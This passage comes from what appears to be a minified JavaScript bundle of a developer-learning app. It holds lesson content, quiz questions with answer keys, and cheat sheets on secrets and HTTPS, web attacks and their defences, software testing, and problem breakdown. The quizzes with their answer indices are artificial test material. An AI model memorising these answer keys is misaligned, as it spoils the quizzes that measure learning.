});`},choices:["The secret key ends up in the public JS bundle","Vite encrypts env variables, so it is fine","`.env` files only work in production","The variable name is too long"],answer:0,why:"Vite replaces `import.meta.env.VITE_*` with the real value at build time. Anyone can read it in the browser. Secret keys must stay on your backend."},{id:"security.secrets-https.3",kind:"debug",difficulty:"medium",prompt:'Calls to an internal API fail with a certificate error. A developer "fixes" it with a callback that always returns `true`. What did they break?',choices:["Nothing, the traffic is still encrypted","Anyone in the middle can pretend to be the API","Only performance gets worse","JSON parsing of the response"],answer:1,why:"Encryption is useless if you do not check who is on the other end. An attacker can show their own certificate, read everything, and pass it on."},{id:"security.secrets-https.4",kind:"mcq",difficulty:"easy",prompt:"Your site uses HTTPS everywhere. Which of these does HTTPS protect against?",choices:["An attacker typing SQL injection into the search box","Stored XSS hidden in user comments on the site","Someone on café Wi-Fi reading the session cookie","A weak password hash leaked from the database"],answer:2,why:"HTTPS protects data while it travels. The other problems live in your code and database, and HTTPS does nothing for them."}]}],cheatSheet:[{title:"Attack → defense",items:[{term:"SQL injection",meaning:"Input becomes SQL → parameters, allowlist for column names"},{term:"XSS",meaning:"Input becomes script → escape by default, sanitize raw HTML, CSP"},{term:"CSRF",meaning:"Other site uses your cookie → SameSite + anti-forgery token, no writes on GET"},{term:"SSRF",meaning:"Server fetches attacker URL → allowlist hosts, block internal IPs"},{term:"IDOR",meaning:"Change the id, see others' data → check ownership on the server"},{term:"Over-posting",meaning:"Body sets fields like IsAdmin → bind to DTOs, not entities"}]},{title:"Passwords",items:[{term:"Use",meaning:"Argon2id, bcrypt or PBKDF2 (library) + unique salt per user"},{term:"Never",meaning:"Plain text, encryption, MD5/SHA-1/SHA-256 alone"},{term:"Salt",meaning:"Random per user → same password, different hash"},{term:"Login errors",meaning:'"Wrong email or password" — do not reveal which'},{term:"Brute force",meaning:"Rate limit / lockout on login"}]},{title:"Secrets & transport",items:[{term:"Secrets",meaning:"Not in git, not in the frontend bundle, not in logs"},{term:"VITE_* vars",meaning:"Public — they are copied into the JS bundle"},{term:"Leaked key",meaning:"Rotate first, then clean up"},{term:"HTTPS",meaning:"Encrypts and checks the server; protects data only while it travels"},{term:"Cert errors",meaning:'Fix the cert — never "trust all" in production'},{term:"Least privilege",meaning:"Each user/service/DB login gets only what it needs"}]},{title:"Myths",items:[{term:'"CORS protects my API"',meaning:"✗ Only browsers apply it; curl ignores it"},{term:'"The button is hidden"',meaning:"✗ UI is not authorization; check on the server"},{term:'"Frontend validates it"',meaning:"✗ Attackers call the API directly"},{term:'"The JWT is encrypted"',meaning:"✗ Anyone can read the payload; the signature only stops changes"},{term:'"We use HTTPS, so we are secure"',meaning:"✗ HTTPS does not fix bugs in your code"}]}]},me=Object.freeze(Object.defineProperty({__proto__:null,default:de},Symbol.toStringTag,{value:"Module"})),ue={id:"testing",title:"Testing",emoji:"🧪",tagline:"Prove it works, and keep it working",lessons:[{id:"testing.why",title:"Why tests",summary:"A safety net that lets you change code without fear.",minutes:3,blocks:[{type:"text",text:'A **test** is code that runs your code and checks the result. If the result is wrong, the test fails. We say it "turns red".'},{type:"text",text:`Tests are a **safety net for change**. You change one part, and the tests tell you if another part broke.
A **regression** is something that worked before and broke after a change. Tests catch regressions early.`},{type:"diagram",text:`Bug found while...   Cost to fix

writing code   █              minutes
unit test run  ██             minutes
QA testing     ██████         hours
production     █████████████  days`},{type:"text",text:"Late bugs cost more. Someone must find the cause, fix it, test again and release again. Real users may also lose data or money."},{type:"example",title:"A shop changes tax rounding",text:"A developer changes how tax is rounded in the cart. The cart tests still pass. But an invoice test fails, because invoice totals now differ by 1 VND. The fix takes five minutes. Without that test, the accountant finds it at month end."},{type:"text",text:"Tests are also **documentation**. The test name tells a new teammate the rule. A wiki page can become old and wrong without anyone noticing. A test fails as soon as it is wrong."},{type:"code",code:{lang:"csharp",text:`[Fact]
public void Refund_is_rejected_after_30_days()
{
    var order = Order.PaidOn(new(2026, 1, 1));
    var today = new DateOnly(2026, 2, 5);

    var allowed = order.CanRefund(today);

    Assert.False(allowed);
}`}}],remember:"Tests let you change code without fear. They catch regressions while they are still cheap to fix.",questions:[{id:"testing.why.1",kind:"mcq",difficulty:"easy",prompt:"What is a **regression**?",choices:["A bug in old code that nobody has touched for years","A feature that worked before and broke after a change","A slow test that makes the whole build take longer","A test that fails only on the build server"],answer:1,why:"A regression means the code went backwards: it used to work, and a change broke it. Old code is not a regression by itself."},{id:"testing.why.2",kind:"scenario",difficulty:"medium",prompt:"You must change the discount logic in a 5-year-old billing module. It has no tests. What is the safest first step?",choices:["Make the change carefully and ask QA to test it all later","Write tests for the current behaviour first, then change it","Rewrite the whole module so it is clean and easy to test","Make the change and watch the error logs after release"],answer:1,why:"Tests that capture today's behaviour are your safety net. If your change breaks something else, a test turns red before release. A full rewrite adds much more risk.",remember:"No tests? Pin the current behaviour before you change it."},{id:"testing.why.3",kind:"truefalse",difficulty:"easy",prompt:"A bug caught by a unit test on your laptop is usually cheaper to fix than in production.",choices:["True","False"],answer:0,why:"On your laptop you just fix the line. In production you also need support, a new release, and maybe data repair for real customers."},{id:"testing.why.4",kind:"compare",difficulty:"medium",prompt:"A new teammate wants to learn the refund rules. Which source is more likely to be correct today?",choices:["A wiki page about refunds, written two years ago","Tests like `Refund_is_rejected_after_30_days` that run on every build"],answer:1,why:"A test that runs on every build fails as soon as the rule and the code disagree. A wiki page can be wrong for years and nobody notices."}]},{id:"testing.pyramid",title:"The test pyramid",summary:"Many small fast tests, a few big slow ones.",minutes:4,blocks:[{type:"text",text:"There are three main kinds of tests. They differ in size, speed and how much they prove."},{type:"list",items:["**Unit test** — checks one small piece, like one function or class. No database, no network. It runs in milliseconds.","**Integration test** — checks that several parts work together. For example, your code plus a real database.","**End-to-end (E2E) test** — uses the whole app like a real user. For example, a robot clicks through the browser."]},{type:"diagram",text:`          ┌───────┐
          │  E2E  │         few, slow
        ┌─┴───────┴─┐
        │integration│       some
     ┌──┴───────────┴──┐
     │      unit       │    many, fast
     └─────────────────┘

 up:   more real, slower, more fragile
 down: faster, cheaper, points to the bug`},{type:"compare",left:{title:"Unit tests",items:["Run in milliseconds","Point to the exact broken code","Cannot see wiring or config bugs"]},right:{title:"End-to-end tests",items:["Take seconds or minutes each","Prove the real user flow works","Fail for many reasons, hard to debug"]}},{type:"text",text:"The **ice cream cone** is the pyramid upside down. The team has a few unit tests and many slow UI tests. Often a lot of the testing is manual."},{type:"diagram",text:` Ice cream cone (anti-pattern)

 ┌───────────────────────┐
 │  manual + UI tests    │  many
 └──┬─────────────────┬──┘
    │  integration    │     some
    └──┬───────────┬──┘
       │   unit    │        few
       └───────────┘`},{type:"example",title:"A team stuck in the cone",text:'A team has 600 browser tests. The suite takes 3 hours and some tests fail at random every day. Developers stop trusting red builds. They move most checks into unit tests. They keep 30 E2E tests for key flows like "log in" and "pay".'}],remember:"Many fast unit tests, some integration tests, a few end-to-end tests for the key user flows.",questions:[{id:"testing.pyramid.1",kind:"mcq",difficulty:"easy",prompt:"You want to check that `CalculateTax(100)` returns `10`. Which kind of test fits best?",choices:["A unit test","An end-to-end browser test","A load test","A manual test by QA"],answer:0,why:"It is one function with clear input and output. A unit test checks it in milliseconds and points straight at the problem."},{id:"testing.pyramid.2",kind:"scenario",difficulty:"medium",prompt:"All unit tests pass. In production, saving an order fails because a column name in the SQL is wrong. Which test would most likely catch this?",choices:["More unit tests with a mocked repository","An integration test against a real database","A unit test for the order total calculation","A code coverage report on the order service"],answer:1,why:"The bug is in how the code talks to the database. A mocked repository never runs the real SQL. An integration test does.",remember:"Wiring bugs need integration tests."},{id:"testing.pyramid.3",kind:"perf",difficulty:"medium",prompt:"Your CI suite has 800 E2E tests and takes 2 hours. Developers push less often and ignore red builds. What is the best long-term fix?",choices:["Run the E2E tests only once a month to save time","Move most checks to unit and integration tests, keep a few E2E","Add more E2E tests so every single screen is covered","Buy faster build servers and keep all the same tests"],answer:1,why:"Most of those checks do not need a browser. Unit and integration tests give the same answer in seconds. Faster servers help a little, but the suite stays slow and fragile."},{id:"testing.pyramid.4",kind:"truefalse",difficulty:"easy",prompt:'The "ice cream cone", with many UI tests and few unit tests, is a healthy shape for a test suite.',choices:["True","False"],answer:1,why:"It is an anti-pattern. The suite becomes slow and fragile. When a UI test fails, it is hard to see which part broke."}]},{id:"testing.unit-test",title:"A good unit test",summary:"Arrange, Act, Assert — one behaviour, a clear name.",minutes:4,blocks:[{type:"text",text:`A good unit test has three parts: **Arrange**, **Act**, **Assert** (AAA).
Arrange sets up the data. Act calls the code you test. Assert checks the result.`},{type:"diagram",text:`┌─────────┐   ┌─────────┐   ┌─────────┐
│ Arrange │ → │   Act   │ → │ Assert  │
└─────────┘   └─────────┘   └─────────┘
 cart with     call          total is
 2 items       Total()       30`},{type:"code",code:{lang:"csharp",text:`// xUnit (C#)
public class CartTests
{
    [Fact]
    public void Total_adds_price_times_quantity()
    {
        // Arrange
        var cart = new Cart();
        cart.Add("pen", price: 5m, qty: 2);
        cart.Add("book", price: 20m, qty: 1);

        // Act
        var total = cart.Total();

        // Assert
        Assert.Equal(30m, total);
    }
}`}},{type:"code",code:{lang:"ts",text:`// Vitest (TypeScript). Jest looks the same.
import { describe, it, expect } from 'vitest';
import { isValidEmail } from './email';

describe('isValidEmail', () => {
  it('rejects an address without @', () => {
    expect(isValidEmail('anna.example.com'))
      .toBe(false);
  });
});`}},{type:"list",items:["**One behaviour per test.** When it fails, you know what broke.","**Clear name.** Say the situation and the expected result, like `Total_is_zero_for_empty_cart`.","**Deterministic.** The same code gives the same result on every run. No real clock, random values or network.","**Fast.** Milliseconds each, so you can run all of them after every change.","**Independent.** Each test sets up its own data. The order of tests does not matter."]},{type:"example",title:"The test called Test1",text:"A test named `Test1` fails on the build server. It has 40 lines and 9 asserts. Nobody knows what it checks. The team spends an hour just reading it. A name like `Discount_is_capped_at_50_percent` would explain it in one second."}],remember:"Arrange, Act, Assert. One behaviour, a clear name, the same result every time.",questions:[{id:"testing.unit-test.1",kind:"code",difficulty:"easy",prompt:"In this test, which line is the **Act** step?",code:{lang:"csharp",text:`var account = new Account(balance: 100m); // 1
account.Withdraw(30m);                    // 2
Assert.Equal(70m, account.Balance);       // 3`},choices:["Line 1","Line 2","Line 3"],answer:1,why:"Line 1 arranges the account. Line 2 calls the behaviour under test, so it is the Act. Line 3 asserts the result."},{id:"testing.unit-test.2",kind:"compare",difficulty:"easy",prompt:"Which test name is better?",choices:["`Withdraw_more_than_balance_throws`","`WithdrawTest2`"],answer:0,why:"The good name says the situation and the expected result. When it fails, the name alone tells you which rule broke."},{id:"testing.unit-test.3",kind:"debug",difficulty:"medium",prompt:'One test has 12 asserts. It checks login, cart, discount and email. It fails with "Expected 3, got 2". What is the main problem?',choices:["It needs a try/catch so that all the other asserts still run","It tests many behaviours, so the failure does not say what broke","`Assert.Equal` is the wrong method for comparing numbers","The test runs too fast to give reliable results"],answer:1,why:'With many behaviours in one test, "Expected 3, got 2" could mean anything. Split it into small tests with clear names. Then each failure points to one rule.',remember:"One behaviour per test."},{id:"testing.unit-test.4",kind:"scenario",difficulty:"hard",prompt:"A unit test for `PriceService` calls a real tax web API. It takes 2 seconds, and fails when the API is down. What is the best fix?",choices:["Add a retry loop so the test calls the API up to 3 times","Give the service a stand-in tax source that returns a fixed rate","Delete the test, because external APIs cannot be tested","Run this test only on Fridays, just before the release"],answer:1,why:"A unit test should be fast and deterministic. A stand-in with a fixed rate tests your price logic only. Check the real API in a separate integration test."}]},{id:"testing.doubles",title:"Test doubles",summary:"Dummy, stub, fake, mock, spy — and when mocks lie.",minutes:5,blocks:[{type:"text",text:"Your code often talks to other things: a database, an email server, the clock. A **test double** takes the place of the real thing in a test. The name comes from a stunt double in films."},{type:"diagram",text:` Production          Test
┌───────────┐       ┌───────────┐
│ OrderSvc  │       │ OrderSvc  │
└─────┬─────┘       └─────┬─────┘
      │ IEmailSender      │ IEmailSender
      ▼                   ▼
┌───────────┐       ┌───────────┐
│SmtpSender │       │FakeSender │
│  (real)   │       │ (double)  │
└───────────┘       └───────────┘`},{type:"diagram",text:`Kind   What it does           Example
─────  ─────────────────────  ─────────────
Dummy  passed in, never used  unused logger
Stub   returns fixed answers  rate is 10%
Fake   simple real version    in-memory DB
Mock   checks expected calls  Send() once
Spy    records the calls      sent emails`},{type:"code",code:{lang:"csharp",text:`// A hand-written spy: it records every email
class SpyEmailSender : IEmailSender
{
    public List<string> Sent { get; } = new();
    public void Send(string to, string body)
        => Sent.Add(to);
}

[Fact]
public void Placing_order_emails_the_customer()
{
    var email = new SpyEmailSender();
    var svc = new OrderService(email);

    svc.Place(new Order("anna@shop.vn"));

    Assert.Single(email.Sent);
    Assert.Equal("anna@shop.vn", email.Sent[0]);
}`}},{type:"text",text:"**When mocks lie.** A mock only knows what you told it. If you are wrong about the real thing, the test passes and production fails."},{type:"compare",left:{title:"Doubles help ✅",items:["Slow or costly things: email, payment, SMS","Things you cannot control: time, random values","Your own small interfaces with clear rules"]},right:{title:"Mocks lie ⚠️",items:["Mocking a library you do not own, like an HTTP client","Checking every internal call, so any refactor breaks the test","So many mocks that almost no real code runs"]}},{type:"example",title:"The payment SDK",text:'A test mocks the payment SDK to return "OK" for any card. The real SDK throws an error for expired cards. The test is green, but customers with old cards see a crash. Better: wrap the SDK in your own small interface and mock that. Then add one integration test against the SDK sandbox.'}],remember:"Use doubles for slow or uncontrolled things. Mock your own interfaces, and check results more than calls.",questions:[{id:"testing.doubles.1",kind:"mcq",difficulty:"easy",prompt:"The constructor needs an `ILogger`, but the code path under test never calls it. You pass in an empty logger. What kind of double is it?",choices:["Dummy","Mock","Spy","Fake"],answer:0,why:"A dummy only fills a parameter and is never used. A mock or spy would be used to check calls, and nothing is checked here."},{id:"testing.doubles.2",kind:"mcq",difficulty:"medium",prompt:"You test an `InvoiceService` that saves invoices. Which double is a **fake**?",choices:["An in-memory repository that really stores and returns invoices","An object that always returns the same invoice for any id","An object that fails the test if `Save` is not called once","A `null` passed in, because the test never uses the repository"],answer:0,why:"A fake is a simple but working version, like a list in memory instead of a database. Always returning the same invoice is a stub. Checking the `Save` call is a mock."},{id:"testing.doubles.3",kind:"scenario",difficulty:"hard",prompt:"A test checks that `GetTotal()` calls `_repo.Load()` once, then `_calc.Sum()` once. A teammate adds a cache. The total is still correct, but the test fails. What is wrong?",choices:["The refactor broke the code, because the call order changed","The test checks the implementation instead of the result","The mock library has a bug with checking call order","The test needs one more mock to cover the new cache"],answer:1,why:"The behaviour did not change, yet the test failed. The test was tied to internal calls. Check the total that `GetTotal()` returns instead.",remember:"A refactor that keeps behaviour should not break tests."},{id:"testing.doubles.4",kind:"debug",difficulty:"medium",prompt:'Unit tests mock `HttpClient` to return `{"price": 10}`. The real partner API returns `{"amount": 10}`. All tests pass, but every price in production is 0. Why did the tests miss it?',choices:["The mock returned the shape you assumed, not the real one","Unit tests cannot check code that parses JSON responses","The tests ran too fast to reach the HTTP call in time","HttpClient cannot be mocked, so the tests were skipped"],answer:0,why:"A mock repeats your belief about the other system. If the belief is wrong, the test is wrong too. An integration or contract test against the real API catches this.",remember:"Do not mock what you do not own."}]},{id:"testing.what-to-test",title:"What to test",summary:"Pick smart inputs: groups, edges and errors.",minutes:4,blocks:[{type:"text",text:"You cannot test every input. So pick inputs smartly.\nAn **equivalence class** is a group of inputs the code should treat the same way. Test one value from each group.\nA **boundary** is the edge between two groups. Many bugs hide at the edges, like `>` written instead of `>=`."},{type:"diagram",text:`Rule: you can buy if age >= 18

 age:  15   16   17 │ 18   19   20
      ──────────────┼──────────────
       refuse       │ allow
                 ▲    ▲    ▲
 test:           17   18   19

 also test invalid: -5, 300, empty`},{type:"code",code:{lang:"ts",text:`// Bug: 18-year-olds are refused
function canBuy(age: number): boolean {
  return age > 18;
}

it.each([
  [17, false],
  [18, true], // this one catches the bug
  [19, true],
])('age %i -> %s', (age, ok) => {
  expect(canBuy(age)).toBe(ok);
});`}},{type:"list",items:["**Happy path** — the normal case. For example, a valid order with two items.","**Edge cases** — empty list, one item, the maximum, zero, the last day of the month.","**Error cases** — bad input, missing data, the database is down. Check the error is clear and nothing is half-saved."]},{type:"text",text:"Test **behaviour**, not private details. Call the public method and check what a caller can see. If you rename a private method, no test should break."},{type:"compare",left:{title:"Behaviour test ✅",items:["Calls the public method","Checks the result or saved state","Survives a refactor"]},right:{title:"Implementation test ⚠️",items:["Calls a private method by reflection","Checks internal fields or call order","Breaks when you clean up the code"]}},{type:"example",title:"The cinema child price",text:"A cinema gives a child price to kids under 12. The team tests age 5 and age 30. Both pass. In production, 12-year-olds also get the child price. Testing 11, 12 and 13 would have shown that the code used `<=` instead of `<`."}],remember:"Test one value per group, plus both sides of every edge. Check results, not private details.",questions:[{id:"testing.what-to-test.1",kind:"scenario",difficulty:"medium",prompt:"Free shipping applies to orders of **500,000 VND or more**. Which set of test values is best?",choices:["100,000 and 1,000,000","499,999 and 500,000 and 500,001","0 and 250,000 and 900,000","500,000 only"],answer:1,why:"The values sit on both sides of the edge and on it. A `>` instead of `>=` bug fails at 500,000. Values far from the edge never show it."},{id:"testing.what-to-test.2",kind:"code",difficulty:"medium",prompt:'The rule is "10 items or more get 10% off". Which test fails and shows the bug?',code:{lang:"ts",text:`function discount(qty: number): number {
  if (qty > 10) return 0.1;
  return 0;
}`},choices:["qty 9 expects 0","qty 10 expects 0.1","qty 11 expects 0.1","qty 0 expects 0"],answer:1,why:"At exactly 10 the rule says 10% off, but `10 > 10` is false, so the code returns 0. Only the boundary value shows the bug.",remember:"Always test the exact boundary value."},{id:"testing.what-to-test.3",kind:"truefalse",difficulty:"medium",prompt:"To test a private helper method, the best way is to make it public or call it by reflection.",choices:["True","False"],answer:1,why:"Test it through the public method that uses it. If the helper needs many tests of its own, it may belong in its own class."},{id:"testing.what-to-test.4",kind:"mcq",difficulty:"easy",prompt:"A `Transfer(amount)` method is tested only with normal amounts like 100 and 250. Which kind of case is missing?",choices:["More happy path cases with other valid amounts","Error cases, like a negative amount or too little money","Load cases, like a million transfers per second"],answer:1,why:"Only the happy path is tested. Money code must also show what happens with bad input, and that nothing changes when the transfer is refused."}]},{id:"testing.flaky",title:"Flaky tests",summary:"Tests that pass and fail with no code change.",minutes:4,blocks:[{type:"text",text:"A **flaky test** passes sometimes and fails sometimes, with no code change. It can be worse than no test. People learn to ignore red builds, and then real failures slip through."},{type:"diagram",text:`Cause            Fix
───────────────  ──────────────────────────
DateTime.Now     inject a clock
new Random()     use a fixed seed
shared data      fresh data per test
test order       each test sets itself up
real network     stub or local fake server
Sleep(500)       wait for the condition`},{type:"list",items:["**Time** — `DateTime.Now` or `new Date()` is different on each run. Tests break at midnight, at month end or in another time zone.","**Randomness** — random data hits a rare bad value once in 100 runs. A fixed **seed** (the start value of the random generator) makes it repeat.","**Shared state and test order** — test A leaves a row in the database or a static field. Test B passes only if A ran first.","**Real network** — a real API is slow or down for a moment.","**Sleeps** — `Task.Delay(500)` hopes the work is done. On a busy build server it is not."]},{type:"code",code:{lang:"csharp",text:`// Flaky: the answer depends on the day you run it
public bool IsWeekend() =>
    DateTime.Now.DayOfWeek is DayOfWeek.Saturday
        or DayOfWeek.Sunday;`}},{type:"code",code:{lang:"csharp",text:`// Testable: the time comes from outside
public class Shop(TimeProvider clock)
{
    public bool IsWeekend()
    {
        var day = clock.GetLocalNow().DayOfWeek;
        return day is DayOfWeek.Saturday
            or DayOfWeek.Sunday;
    }
}

// FakeTimeProvider comes from the NuGet package
// Microsoft.Extensions.TimeProvider.Testing
var clock = new FakeTimeProvider(
    new DateTimeOffset(2026, 10, 10, 9, 0, 0,
        TimeSpan.Zero)); // a Saturday
Assert.True(new Shop(clock).IsWeekend());`}},{type:"example",title:"The midnight failure",text:'A test checks that an order expires after 24 hours. It uses `DateTime.Now` twice and compares the dates. It fails only when the build runs a few seconds before midnight. The fix: pass in a fixed clock, so "now" is the same on every run.'}],remember:"A test must give the same result on every run. Control time, randomness, shared data and the network.",questions:[{id:"testing.flaky.1",kind:"debug",difficulty:"medium",prompt:"A test fails when the whole suite runs, but always passes when you run it alone. What is the most likely cause?",choices:["Shared state: another test leaves data behind","The test name is too long for the test runner","The test machine has too little free disk space","The Arrange and Assert steps are in the wrong order"],answer:0,why:"Alone, the test starts clean. In the suite, an earlier test changed a database row or a static field. Give each test its own fresh data.",remember:"Passes alone, fails together → shared state."},{id:"testing.flaky.2",kind:"code",difficulty:"medium",prompt:"This test fails about once in 20 runs on the build server. What is the best fix?",code:{lang:"ts",text:`it('shows the toast after saving', async () => {
  clickSave();
  await sleep(300);
  expect(toastIsVisible()).toBe(true);
});`},choices:["Increase the sleep to 3000 ms to be safe","Wait until the toast appears, with a timeout","Skip this test when it runs on the build server","Run it three times and pass if any run passes"],answer:1,why:"A fixed sleep guesses how long the work takes. Waiting for the real condition is fast when the app is fast, and patient when the server is busy. A longer sleep only makes the guess slower."},{id:"testing.flaky.3",kind:"scenario",difficulty:"hard",prompt:"A test builds 50 customers with random data. About once a month it fails, and nobody can reproduce it. What helps most?",choices:["Use a fixed seed, and log the seed when the test fails","Retry the test automatically until it passes","Make 5,000 random customers so the bad case shows up more","Remove all random data from every test in the project"],answer:0,why:'With a known seed, the same "random" data comes back, so you can rerun the exact failing case. The rare value may be a real bug. Fix it and keep it as a normal test.'},{id:"testing.flaky.4",kind:"truefalse",difficulty:"easy",prompt:"Retrying a flaky test until it passes fixes the problem.",choices:["True","False"],answer:1,why:"Retries hide the problem. The cause is still there, and sometimes it is a real bug in the product, like a race condition."}]},{id:"testing.tdd-coverage",title:"TDD and coverage",summary:"Red, green, refactor — and why 100% is not enough.",minutes:4,blocks:[{type:"text",text:"**TDD** (test-driven development) means you write the test **before** the code. You work in very small steps."},{type:"diagram",text:`  ┌────────────┐          ┌────────────┐
  │    RED     │          │   GREEN    │
  │ write a    │ ───────→ │ write just │
  │ failing    │          │ enough code│
  │ test       │          │ to pass    │
  └────────────┘          └─────┬──────┘
        ↑                       │
        │    ┌────────────┐     │
        └─── │  REFACTOR  │ ←───┘
             │ clean up,  │
             │ stay green │
             └────────────┘`},{type:"list",items:["Seeing the test fail first proves it can catch the bug.","You think about the behaviour before the code.","Steps are small, so when something breaks, the cause is in the last few lines."]},{type:"text",text:"**Code coverage** is the percent of your code that ran during the tests. Low coverage shows untested code. High coverage does **not** prove the code is right."},{type:"code",code:{lang:"csharp",text:`public decimal Withdraw(decimal amount)
{
    _balance -= amount;
    return _balance;
}

[Fact]
public void Withdraw_reduces_balance()
{
    var acc = new Account(100m);
    Assert.Equal(70m, acc.Withdraw(30m));
}
// 100% coverage. But Withdraw(500m) gives -400.
// The "not enough money" check is missing,
// and coverage cannot measure missing code.`}},{type:"text",text:"**Mutation testing** in one line: a tool changes your code a little, like `>` to `>=`. Some test should now fail."},{type:"example",title:"Chasing a number",text:'A team sets a rule: "90% coverage or the build fails". Soon people write tests that call methods but check very little. Coverage reaches 92%, and bugs still reach users. A better habit: every bug fix comes with a test that failed before the fix.'}],remember:"Red, green, refactor. Coverage shows what is untested, not what is correct.",questions:[{id:"testing.tdd-coverage.1",kind:"mcq",difficulty:"easy",prompt:"In TDD, what do you do in the **red** step?",choices:["Write a small test that fails","Write all the code, then the tests","Fix the tests that are red in CI","Clean up the code, keep behaviour"],answer:0,why:"Red means a new test that fails, because the behaviour does not exist yet. Green makes it pass. Refactor cleans up."},{id:"testing.tdd-coverage.2",kind:"truefalse",difficulty:"easy",prompt:"100% code coverage means the code has no bugs.",choices:["True","False"],answer:1,why:"Coverage only says the lines ran. It does not say the asserts were right, and it cannot see code that is missing."},{id:"testing.tdd-coverage.3",kind:"scenario",difficulty:"medium",prompt:"You write a new test in TDD. It passes the very first time, before you write any code. What should you think?",choices:["Great, the feature already works, so move on","The test may be wrong, or may not check the new behaviour","TDD tests always pass at first, so this is normal","The build server is caching old test results"],answer:1,why:"A new TDD test should fail first. If it passes, the behaviour already exists or the test checks something else. Look closer before you continue."},{id:"testing.tdd-coverage.4",kind:"scenario",difficulty:"hard",prompt:"A mutation tool changes `amount > 1000` to `amount >= 1000`. All tests still pass. What does this tell you?",choices:["The code is correct, because the tests still pass","No test uses exactly 1000, the boundary value","The mutation tool has a bug and should be ignored","Coverage for that line must be below 100%"],answer:1,why:"The two versions differ only when the amount is exactly 1000. No test used 1000, so no test noticed. Add a test at the boundary.",remember:"A surviving mutant shows a gap in your tests."}]}],cheatSheet:[{title:"Kinds of tests",items:[{term:"Unit test",meaning:"One small piece, no database or network, runs in milliseconds"},{term:"Integration test",meaning:"Several parts together, like code plus a real database"},{term:"End-to-end (E2E) test",meaning:"The whole app, used like a real user would"},{term:"Regression",meaning:"Worked before, broke after a change"},{term:"Test pyramid",meaning:"Many unit, some integration, a few E2E tests"},{term:"Ice cream cone",meaning:"Upside-down pyramid: mostly slow UI and manual tests"}]},{title:"A good unit test",items:[{term:"Arrange, Act, Assert",meaning:"Set up, call the code, check the result"},{term:"One behaviour",meaning:"A failure points to exactly one rule"},{term:"Clear name",meaning:"Situation plus expected result: `Total_is_zero_for_empty_cart`"},{term:"Deterministic",meaning:"Same code, same result on every run"},{term:"Fast and independent",meaning:"Milliseconds each, any order, own data"}]},{title:"Test doubles",items:[{term:"Dummy",meaning:"Fills a parameter, never used"},{term:"Stub",meaning:"Returns fixed answers"},{term:"Fake",meaning:"Simple working version, like an in-memory repository"},{term:"Mock",meaning:"Checks that expected calls happened"},{term:"Spy",meaning:"Records calls so the test can check them later"},{term:"Over-mocking",meaning:"Tests the internal calls, breaks on every refactor"}]},{title:"What to test",items:[{term:"Equivalence class",meaning:"Inputs treated the same way — test one of each"},{term:"Boundary",meaning:"Test both sides of the edge: 17, 18, 19"},{term:"Happy path",meaning:"The normal case"},{term:"Edge and error cases",meaning:"Empty, zero, maximum, bad input, failures"},{term:"Behaviour, not details",meaning:"Test through the public method, not private ones"}]},{title:"Flaky tests, TDD and coverage",items:[{term:"Flaky test",meaning:"Passes or fails with no code change"},{term:"Inject a clock",meaning:"Pass time in, for example with `TimeProvider`"},{term:"Fixed seed",meaning:"Random data that repeats, so failures can be reproduced"},{term:"Wait, do not sleep",meaning:"Wait for the real condition, with a timeout"},{term:"Red, green, refactor",meaning:"Failing test, simplest code to pass, then clean up"},{term:"Coverage",meaning:"Shows what ran, not what is correct"},{term:"Mutation testing",meaning:"Change the code a little; some test should fail"}]}]},pe=Object.freeze(Object.defineProperty({__proto__:null,default:ue},Symbol.toStringTag,{value:"Module"})),ge={id:"thinking",title:"Thinking",emoji:"🧠",tagline:"Understand, split, test the edges, measure",lessons:[{id:"thinking.understand",title:"Understand the problem first",summary:'Know what "done" looks like before you code.',minutes:3,blocks:[{type:"text",text:`Most bugs are not typing mistakes. They come from solving the **wrong problem**, or only half of the right one.
Before you write code (or ask an AI to write it), make sure you can say what "done" looks like.`},{type:"list",items:["**Inputs** — what goes in? From where?","**Outputs** — what comes out? In what shape?","**Rules** — what must always happen? What must never happen?","**Examples** — can you write 2–3 real examples, including one weird one?"]},{type:"example",title:'"Add a search box"',text:`Search what? Only names, or emails too? Exact match or "contains"? Upper/lower case? What if there are 50,000 results?
Five minutes of questions can save two days of rework.`},{type:"text",text:`A simple trick: **say the problem back in your own words**. For example: "So you want X when Y, and Z otherwise — right?"
If they say "not quite", you just saved time.`},{type:"diagram",text:`Vague request
     ↓
Say it back  →  "Did I get this right?"
     ↓
Concrete examples (normal + weird)
     ↓
Definition of done
     ↓
Code`}],remember:"If you cannot write an example input and output, you are not ready to code.",questions:[{id:"thinking.understand.1",kind:"scenario",difficulty:"easy",prompt:'Your lead says: "Make the export faster." What do you do first?',choices:["Move the export to a background job so users never wait for it","Add a cache in front of the export queries so repeat runs are quick","Ask which export, how slow it is now, and the target time","Profile every endpoint in the app to find all the slow parts"],answer:2,why:'"Faster" has no clear end point. You need the current number, the target and the scope. Without them you cannot know when you are done.',remember:"Vague goal → ask for numbers and scope."},{id:"thinking.understand.2",kind:"mcq",difficulty:"medium",prompt:"Why write 2–3 concrete examples (input → expected output) before coding?",choices:["They expose unclear rules early, while changes are cheap","They replace the need for automated tests later in the project","They let you skip code review, since the examples prove it works","They are mainly useful for junior developers who are still learning"],answer:0,why:"When you try to write the expected output for a weird case, you often find you do not know it. Better to find that out before the code exists."},{id:"thinking.understand.3",kind:"scenario",difficulty:"medium",prompt:`You ask an AI: "Write a function that splits a bill between friends."
It returns clean code. The code divides the total by the number of people. What did your request miss?`,choices:["Clearer variable names, so the AI understands the intent better","Rules for rounding, the leftover cent, and unequal shares","A class with an interface, so it is easier to extend later","More comments in the code, so the logic is easy to follow"],answer:1,why:"The code solves the problem it was given. The problem was not fully defined: 100 / 3 = 33.33 × 3 = 99.99, so one cent goes missing.",remember:"AI solves the problem you describe — describe the whole problem."},{id:"thinking.understand.4",kind:"truefalse",difficulty:"easy",prompt:"If the code passes all its tests, it solves the user’s problem.",choices:["True","False"],answer:1,why:"Tests check what you **thought** the problem was. If you misunderstood the requirement, the code and the tests are wrong together."}]},{id:"thinking.break-down",title:"Break big problems into small ones",summary:"Small steps you can check.",minutes:4,blocks:[{type:"text",text:'A task like "build checkout" is scary and hard to estimate. Split it until each piece is small enough to **finish and check in a day or less**.'},{type:"diagram",text:`Build checkout
├─ Show cart total
├─ Collect address
│   ├─ Form + validation
│   └─ Save address
├─ Take payment
│   ├─ Call payment API
│   └─ Handle failure / retry
